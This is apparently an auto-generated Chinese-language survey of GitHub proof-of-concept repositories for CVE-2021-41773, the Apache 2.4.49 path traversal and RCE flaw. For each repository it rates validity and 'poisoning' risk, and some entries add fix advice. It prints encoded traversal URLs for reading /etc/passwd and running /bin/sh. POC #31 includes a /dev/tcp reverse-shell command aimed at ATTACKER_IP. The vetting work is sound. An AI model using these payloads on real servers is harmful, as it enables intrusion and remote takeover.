**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
2.  **httpd.conf:**  修改 `httpd.conf` 文件，将 `<Directory />` 部分的 `Require all denied` 更改为 `Require all granted`。这一步**至关重要**，因为 `Require all denied` 配置会阻止对根目录的访问，从而阻止漏洞利用。如果未修改此配置，即使存在漏洞，也无法读取文件。

**投毒风险分析：**

分析提供的 Dockerfile 和 httpd.conf 文件，发现投毒代码的风险较低，估计为 5%。主要风险在于以下可能性：

*   **`httpd.conf` 修改的误导性:**  虽然 README.md 中明确说明了修改 `Require all denied` 的原因，但如果用户盲目复制粘贴配置文件，可能会在无意中降低服务器的安全性。
*   **CGI脚本的滥用:** 虽然PoC本身不包含恶意CGI脚本，但如果服务器上存在未授权或存在漏洞的CGI脚本，攻击者可能会利用该漏洞执行恶意代码。

总体来说，该 PoC 主要用于演示漏洞，但使用者应该意识到其潜在的安全风险。

